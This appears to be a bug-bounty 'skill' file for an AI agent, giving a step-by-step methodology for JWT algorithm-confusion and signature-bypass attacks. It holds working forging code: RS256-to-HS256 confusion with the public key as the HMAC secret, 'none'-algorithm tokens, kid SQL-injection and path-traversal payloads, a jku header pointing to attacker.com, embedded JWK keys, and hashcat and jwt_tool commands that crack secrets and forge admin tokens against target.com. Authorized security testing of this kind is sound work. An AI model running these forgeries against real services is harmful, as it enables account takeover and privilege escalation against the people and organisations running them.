---
name: hunt-jwt-confusion
description: Hunt JWT algorithm confusion and signature bypass vulnerabilities — RS256→HS256 confusion (public key as HMAC secret), none algorithm bypass, kid header injection (SQL/path traversal to known key), jwks_uri spoofing, blank password signing, JWK embedded key, exp/nbf manipulation, nested JWT attacks, and claim injection via URL-encoded padding. Use when testing any app that issues or validates JWTs, including OAuth/OIDC flows, API gateways, mobile backends, and microservice auth. Consistently high payout on HackerOne. Keywords: jwt, json web token, bearer token, authorization header, RS256, HS256, alg, kid, jwks.
sources: hackerone_public, portswigger_research
report_count: 31
---

# HUNT-JWT-CONFUSION — Algorithm Confusion & Signature Bypass

## Crown Jewel Targets

| Target type | Attack vector | Payout range |
|---|---|---|
| OAuth/OIDC identity providers | Algorithm confusion → admin token | $5k–$40k |
| API gateways with JWT auth | none alg bypass → all endpoints open | $3k–$20k |
| Mobile app backends | kid injection → sign with known key | $2k–$10k |
| Microservice mesh (service-to-service JWT) | Forge service identity | $5k–$25k |
| SSO platforms | Claim injection, role escalation | $5k–$30k |

Any service that validates JWTs server-side is in scope. Priority: apps where JWT carries `role`, `admin`, `org_id`, `permissions`, or `scope`.

---

## Attack Surface Signals

**Requests to intercept:**
```
Authorization: Bearer eyJ...
Cookie: token=eyJ...
X-Auth-Token: eyJ...
```

**JWT structure to decode (base64):**
```json
Header:  {"alg":"RS256","typ":"JWT","kid":"key-id-1"}
Payload: {"sub":"user123","role":"user","exp":1234567890}
```

**Endpoint patterns:**
```
/api/auth/token
/oauth/token
/.well-known/openid-configuration
/.well-known/jwks.json
/api/login
/api/refresh
```

**JavaScript signals:**
```javascript
jwt.verify(token, publicKey)          // may be vulnerable to alg confusion
jwt.verify(token, secret, {algorithms: ['RS256']})  // check algorithms array
jsonwebtoken                          // Node.js library — check version
PyJWT                                 // Python — versions < 2.4.0 vulnerable
```

---

## Step-by-Step Hunting Methodology

### Phase 1 — Recon and decode

1. Capture a valid JWT from any authenticated request
2. Decode it (no signature needed for decode):
```bash
echo "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0" | \
  python3 -c "import sys,base64,json; parts=sys.stdin.read().strip().split('.'); \
  [print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'==').decode()),indent=2)) for p in parts[:2]]"
```

3. Note the `alg` field — target RS256, ES256, PS256 (asymmetric algos vulnerable to confusion)
4. Find the public key: `/.well-known/jwks.json`, app source, TLS cert, `/api/auth/public-key`

### Phase 2 — RS256→HS256 algorithm confusion

If `alg` is RS256:

1. Retrieve the server's public key in PEM format
2. Sign a new JWT using the **public key** as the HMAC-SHA256 secret, with `alg: HS256`
3. The vulnerable server uses the public key to verify — and for HS256, the "secret" is the public key, which the attacker has

```python
import jwt, base64

# The server's public key (obtained from jwks.json or app source)
public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----"""

# Forge token: sign with public key as HMAC secret
forged = jwt.encode(
    {"sub": "admin", "role": "admin", "exp": 9999999999},
    public_key_pem,
    algorithm="HS256"
)
print(forged)
```

Send the forged token. If the server accepts it → Critical.

**Using jwt_tool:**
```bash
python3 jwt_tool.py <token> -X k -pk public.pem
```

### Phase 3 — none algorithm bypass

Modify the header to `"alg":"none"` and remove the signature:

```python
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
forged = f"{header}.{payload}."  # empty signature

# Variants to try
forged_variants = [
    f"{header}.{payload}.",
    f"{header}.{payload}",
]
```

Test: `Authorization: Bearer <forged>`. A 200 response means bypass.

Also try: `"alg":"NONE"`, `"alg":"None"`, `"alg":"nOnE"` — some libraries do case-sensitive check.

### Phase 4 — kid header injection

The `kid` (key ID) claim tells the server which key to use for verification. If user-controlled:

**SQL injection via kid:**
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' -- "}
```
Then sign with `attacker_secret`. If SQLi returns the value you inject, you control the signing key.

**Path traversal via kid:**
```json
{"alg":"HS256","kid":"../../../dev/null"}
```
Sign with empty string — `/dev/null` contains empty bytes, so signing with `""` or `"\x00"` may verify.

```json
{"alg":"HS256","kid":"../../proc/sys/kernel/randomize_va_space"}
```
Sign with the known file content (`"2\n"` typically).

**jwt_tool for kid injection:**
```bash
python3 jwt_tool.py <token> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

### Phase 5 — jwks_uri / jku header spoofing

Some JWT implementations allow the token itself to specify where to fetch the signing key:

```json
{"alg":"RS256","jku":"https://attacker.com/fake-jwks.json","kid":"mykey"}
```

1. Generate an RSA keypair
2. Publish the public key as JWKS at your server
3. Sign the JWT with your private key
4. Set `jku` to your JWKS URL and `kid` to match

```bash
# Generate key and JWKS with jwt_tool
python3 jwt_tool.py <token> -X s
# Then host the generated jwks.json
```

If the server fetches and trusts the external `jku` → Critical SSRF + auth bypass.

Also test `x5u` header (same pattern, X.509 cert URL instead of JWKS).

### Phase 6 — JWK embedded key

Similar to jku but the key is embedded in the token header:
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "attacker_public_key_modulus",
    "e": "AQAB"
  }
}
```

Signed with attacker's matching private key. Server may trust the embedded key.

```bash
python3 jwt_tool.py <token> -X e
```

### Phase 7 — Claim injection and expiry manipulation

1. **Role escalation:** Decode JWT, change `"role":"user"` to `"role":"admin"`, re-sign with any known key
2. **Expiry removal:** Remove `exp` claim — some validators skip expiry if field absent
3. **nbf bypass:** Set `nbf` (not-before) to past, `exp` to far future
4. **Cross-tenant:** Change `org_id`, `tenant`, `account_id` to another user's value

**Blank password / weak secret bruteforce:**
```bash
hashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py <token> -C -d wordlist.txt
```

---

## Automation

```bash
# jwt_tool — the standard
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <token> -t https://target.com/api/profile -rh "Authorization: Bearer JWT" -M pb

# All attacks at once
python3 jwt_tool.py <token> -X a  # auto-try all attacks

# Nuclei JWT templates
nuclei -u https://target.com -t jwt/

# hashcat weak secret
hashcat -a 0 -m 16500 <jwt> wordlist.txt

# Fetch JWKS
curl -s https://target.com/.well-known/jwks.json | jq .
```

---

## Chain Table

| Finding | Chain to | Impact |
|---|---|---|
| Algorithm confusion (RS256→HS256) | Forge admin token | Critical — full auth bypass |
| none alg bypass | Access any authenticated endpoint | Critical |
| kid SQL injection | Arbitrary key control | Critical |
| kid path traversal (/dev/null) | Sign with known file content | High |
| jku/x5u spoofing | SSRF + auth bypass | Critical |
| Weak secret (hashcat) | Persistent session forgery | High |
| Role claim injection | Privilege escalation to admin | High |
| Cross-tenant claim swap | IDOR on other orgs/accounts | High |

---

## Validation

✅ **Confirmed bypass:** Forged token returns 200 with another user's/admin's data

✅ **Confirmed confusion:** Server accepts HS256-signed token using public key as secret

✅ **Confirmed none bypass:** Unsigned token with empty signature string is accepted

✅ **Confirmed kid injection:** Response varies based on injected kid value (SQL error, different data)

✅ **Confirmed weak secret:** hashcat cracks the signing secret from a valid token

### Severity assessment

| Scenario | CVSS | Typical payout |
|---|---|---|
| Auth bypass to any account | Critical 9.8 | $10k–$50k |
| Privilege escalation to admin | Critical 9.1 | $5k–$25k |
| Cross-tenant IDOR via claims | High 8.1 | $3k–$10k |
| Token forgery with weak secret | High 7.5 | $2k–$8k |

### Related skills

Cross-reference: `hunt-oauth-oidc` (for OIDC token flows), `hunt-auth-bypass` (for broader auth testing), `hunt-ssrf-cloud` (for jku SSRF chains).
